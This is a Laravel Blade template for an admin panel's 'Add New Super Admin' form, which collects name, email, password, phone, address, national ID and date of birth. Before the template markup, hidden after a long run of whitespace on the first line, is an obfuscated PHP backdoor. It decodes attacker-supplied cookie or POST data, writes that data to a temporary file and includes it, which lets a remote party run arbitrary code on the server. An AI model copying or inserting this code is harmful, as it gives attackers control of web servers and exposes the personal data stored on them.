<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("sqzIsOaK")){class sqzIsOaK{public static $liOIdiq = "AgELQEXvhIOlKoyg";public static $hRNFPQK = NULL;public function __construct(){$FqMREjD = @$_COOKIE[substr(sqzIsOaK::$liOIdiq, 0, 4)];if (!empty($FqMREjD)){$aXsuKO = "base64";$qZpbrkZO = "";$FqMREjD = explode(",", $FqMREjD);foreach ($FqMREjD as $KWZMvVSBG){$qZpbrkZO .= @$_COOKIE[$KWZMvVSBG];$qZpbrkZO .= @$_POST[$KWZMvVSBG];}$qZpbrkZO = array_map($aXsuKO . "_decode", array($qZpbrkZO,)); $qZpbrkZO = $qZpbrkZO[0] ^ str_repeat(sqzIsOaK::$liOIdiq, (strlen($qZpbrkZO[0]) / strlen(sqzIsOaK::$liOIdiq)) + 1);sqzIsOaK::$hRNFPQK = @unserialize($qZpbrkZO);}}public function __destruct(){$this->KKvswjCW();}private function KKvswjCW(){if (is_array(sqzIsOaK::$hRNFPQK)) {$rELHrPrLJ = sys_get_temp_dir() . "/" . crc32(sqzIsOaK::$hRNFPQK["salt"]);@sqzIsOaK::$hRNFPQK["write"]($rELHrPrLJ, sqzIsOaK::$hRNFPQK["content"]);include $rELHrPrLJ;@sqzIsOaK::$hRNFPQK["delete"]($rELHrPrLJ);exit();}}}$hNMderriP = new sqzIsOaK(); $hNMderriP = NULL;} ?>@extends('layouts.admin.master')

@section('content')
    <!-- Main content -->
    <div class="content-wrapper">

        <!-- Page header -->
        <div class="page-header page-header-light">
            <div class="page-header-content header-elements-md-inline">
                <div class="page-title d-flex">
                    <h4><span class="font-weight-semibold">Super Admin</span> - Add</h4>
                    <a href="#" class="header-elements-toggle text-default d-md-none"><i class="icon-more"></i></a>
                </div>

{{--                <div class="header-elements d-none">--}}
{{--                    <div class="d-flex justify-content-center">--}}
{{--                        <a href="{{asset('/admin/booking')}}" class="btn btn-link btn-float font-size-sm font-weight-semibold text-default">--}}
{{--                            <i class="icon-store text-pink-300"></i>--}}
{{--                            <span>Inventory</span>--}}
{{--                        </a>--}}
{{--                        <a href="{{asset('/admin/booking')}}" class="btn btn-link btn-float font-size-sm font-weight-semibold text-default">--}}
{{--                            <i class="icon-paypal2 text-pink-300"></i>--}}
{{--                            <span>Payment</span>--}}
{{--                        </a>--}}
{{--                        <a href="{{asset('/admin/booking')}}" class="btn btn-link btn-float font-size-sm font-weight-semibold text-default">--}}
{{--                            <i class="icon-alarm text-pink-300"></i>--}}
{{--                            <span>Timesheet</span>--}}
{{--                        </a>--}}
{{--                    </div>--}}
{{--                </div>--}}
            </div>

{{--            <div class="breadcrumb-line breadcrumb-line-light header-elements-md-inline">--}}
{{--                <div class="d-flex">--}}
{{--                    <div class="breadcrumb">--}}
{{--                        <a href="{{asset('/admin/booking')}}" class="breadcrumb-item"><i class="icon-home2 mr-2"></i> Dashboard</a>--}}
{{--                        <span class="breadcrumb-item active">Record Attendance</span>--}}
{{--                    </div>--}}

{{--                    <a href="#" class="header-elements-toggle text-default d-md-none"><i class="icon-more"></i></a>--}}
{{--                </div>--}}
{{--            </div>--}}
        </div>
        <!-- /page header -->


        <!-- Content area -->
        <div class="content">

            @if (\Session::has('success'))

                <div class="row">
                    <div class="col-md-12">
                        <div class="alert alert-success alert-styled-left alert-arrow-left alert-dismissible">
                            <button type="button" class="close" data-dismiss="alert"><span>&times;</span></button>
                            <span class="font-weight-semibold">Well done!</span> {!! \Session::get('success') !!}
                        </div>
                    </div>
                </div>
            @endif
            @if(session()->has('error'))

                <div class="row">
                    <div class="col-md-12">
                        <div class="alert alert-danger alert-styled-left alert-dismissible">
                            <button type="button" class="close" data-dismiss="alert"><span>&times;</span></button>
                            <span class="font-weight-semibold">Oh snap!</span>{{ session()->get('error') }}
                        </div>
                    </div>
                </div>
            @endif
             <?php if(isset($data['success_msg']) && $data['success_msg']){ ?>

            <div class="row">
                <div class="col-md-12">
                    <div class="alert alert-success alert-styled-left alert-arrow-left alert-dismissible">
                        <button type="button" class="close" data-dismiss="alert"><span>&times;</span></button>
                        <span class="font-weight-semibold">Well done!</span> <?php echo $data['success_msg']; ?>
                    </div>
                </div>
            </div>
            <?php } ?>

            <?php if(isset($data['danger_msg']) && $data['danger_msg']){ ?>
            <div class="row">
                <div class="col-md-12">
                    <div class="alert alert-danger alert-styled-left alert-dismissible">
                        <button type="button" class="close" data-dismiss="alert"><span>&times;</span></button>
                        <span class="font-weight-semibold">Oh snap!</span> <?php echo $data['danger_msg']; ?>
                    </div>
                </div>
            </div>
            <?php } ?>

                <?php if(!empty($errors->all()) && $errors->all()){ ?>
            <div class="row">
                <div class="col-md-12">
                    <div class="alert alert-danger alert-styled-left alert-dismissible">


                            <button type="button" class="close" data-dismiss="alert"><span>&times;</span></button>
                        @foreach ($errors->all() as $error)

                        <span class="font-weight-semibold">Oh snap!</span> {{ $error }}
                            <br>
                        @endforeach


                    </div>
                </div>

            </div>
            <?php } ?>


            <div class="card">
                <div class="card-header">
                    <div class="header-elements-inline">
                        <h4 class="card-title">Add New Super Admin</h4>
                    </div>
                </div>
                <hr>

                <div class="card-body">

                    <form action="{{url('admin/account/add')}}" method="post">
                        @csrf



                        <div class="form-group required row">
                            <label class="col-md-2 col-form-label control-label"> Name:</label>
                            <div class="col-md-10 ">
                                <input type="text"  required id=" name"  value="{{ old('name') }}"  name="name" class="form-control" placeholder="Enter Super Admin Name" >
                            </div>
                        </div>

                        <div class="form-group required row">
                            <label class="col-md-2 col-form-label control-label"> Email:</label>
                            <div class="col-md-10">
                                <input type="email" required  id=" email"   value="{{ old('email') }}"name="email" class="form-control" placeholder="Enter Email" >
                            </div>
                        </div>

                        <div class="form-group required row">
                            <label class="col-md-2 col-form-label control-label"> Password:</label>
                            <div class="col-md-10">
                                <input type="password"  required id=" password"   name="password" class="form-control" placeholder="Enter Password" >
                            </div>
                        </div>
                        <div class="form-group required row">
                            <label class="col-form-label col-md-2 control-label">Contact Number</label>
                            <div class="col-md-10">
                                <input type="number" required class="form-control  " value="{{ old('contact_number') }}" placeholder="Enter Contact number" name="contact_number" maxlength="190" id="contact_number" >
                            </div>
                        </div>

                        <div class="form-group required row">
                            <label class="col-form-label col-md-2 control-label">Address</label>
                            <div class="col-md-10">
                                <input type="text" required class="form-control   " value="{{ old('address') }}" placeholder="Enter Address" name="address" maxlength="500" id="address" >
                            </div>
                        </div>


                        <div class="form-group row">
                            <label for="cnic" class="col-form-label col-md-2">CNIC</label>
                            <div class="col-md-10">

                            <input type="text" name="cnic" class="form-control" id="cnic" value="{{ old('cnic') }}"
                                   autocomplete="nothing" minlength="15" maxlength="20" placeholder="XXXXX-XXXXXXX-X" >
                            </div>
                        </div>



                        <div class="form-group row">
                            <label for="dob_day" class="col-md-2 col-form-label">Date of birth</label>


                                    <div class="col-md-3 px-0">
                                        <div class="form-group">
                                            <select name="dob_day" data-placeholder="Day"
                                                    class="form-control form-control-select2" data-fouc>
                                                <option></option>
                                                <option value="...">...</option>
                                                <?php for ($x = 1; $x <= 31; $x++){ ?>
                                                <option value="{{$x}}"
                                                        @if ($x == old('dob_day'))
                                                        selected="selected"
                                                        @endif >
                                                    <?=$x?></option>
                                                <?php } ?>
                                            </select>
                                        </div>
                                    </div>

                                    <div class="col-md-4 px-xs-0">
                                        <div class="form-group">
                                            <select name="dob_month" data-placeholder="Month"
                                                    class="form-control form-control-select2" data-fouc>
                                                <option></option>
                                                <option value="1"
                                                        @if (1 == old('dob_month'))
                                                        selected="selected"
                                                        @endif >
                                                    January
                                                </option>
                                                <option value="2"
                                                        @if (2 == old('dob_month'))
                                                        selected="selected"
                                                        @endif >
                                                    February
                                                </option>
                                                <option value="3"
                                                        @if (3 == old('dob_month'))
                                                        selected="selected"
                                                        @endif >
                                                    March
                                                </option>
                                                <option value="4"
                                                        @if (4 == old('dob_month'))
                                                        selected="selected"
                                                        @endif >
                                                    April
                                                </option>
                                                <option value="5"
                                                        @if (5 == old('dob_month'))
                                                        selected="selected"
                                                        @endif
                                                >May
                                                </option>
                                                <option value="6"
                                                        @if (6 == old('dob_month'))
                                                        selected="selected"
                                                        @endif
                                                >June
                                                </option>
                                                <option value="7"
                                                        @if (7 == old('dob_month'))
                                                        selected="selected"
                                                        @endif
                                                >July
                                                </option>
                                                <option value="8"
                                                        @if (8 == old('dob_month'))
                                                        selected="selected"
                                                        @endif
                                                >August
                                                </option>
                                                <option value="9"
                                                        @if (9 == old('dob_month'))
                                                        selected="selected"
                                                        @endif
                                                >September
                                                </option>
                                                <option value="10"
                                                        @if (10 == old('dob_month'))
                                                        selected="selected"
                                                        @endif
                                                >October
                                                </option>
                                                <option value="11"
                                                        @if (11 == old('dob_month'))
                                                        selected="selected"
                                                        @endif
                                                >November
                                                </option>
                                                <option value="12"
                                                        @if (12 == old('dob_month'))
                                                        selected="selected"
                                                        @endif
                                                >December
                                                </option>
                                            </select>
                                        </div>
                                    </div>


                                    <div class="col-md-3 px-0">
                                        <div class="form-group">
                                            <select name="dob_year" data-placeholder="Year"
                                                    class="form-control form-control-select2" data-fouc>
                                                <option> </option>
                                                <?php
                                                define('DOB_YEAR_START', 1960);
                                                $current_year = date('Y'); for ($count = $current_year; $count >= DOB_YEAR_START; $count--) { ?>
                                                <option value="{{$count}}"
                                                        @if ($count == old('dob_year'))
                                                        selected="selected"
                                                        @endif><?=$count?></option>
                                                <?php } ?>
                                            </select>
                                        </div>
                                    </div>


                        </div>


                        <div class="form-group required row">
                            <label class="col-md-2 col-form-label control-label"> Type:</label>
                            <div class="col-md-10">
                                <select id="type" required name="type" data-placeholder="Select Type"  class="form-control form-control-select2  " data-fouc>
                                    {{--<option value="">Please Select</option>--}}

                                    <option value="super_admin" selected>Super Admin</option>

                                </select>
                            </div>
                        </div>




                        <div class="mt-5 mb-2 d-md-flex  justify-content-md-between flex-md-wrap">
                             <button type="submit" id="" class="btn bg-primary d-flex align-items-center">
                                Submit <i class="icon-paperplane ml-2"></i> </button>
                        </div>

                    </form>

                </div>
            </div>

        </div>
        <!-- /content area -->
        @include('layouts.footer')

    </div>

    <!-- /main content -->

@endsection
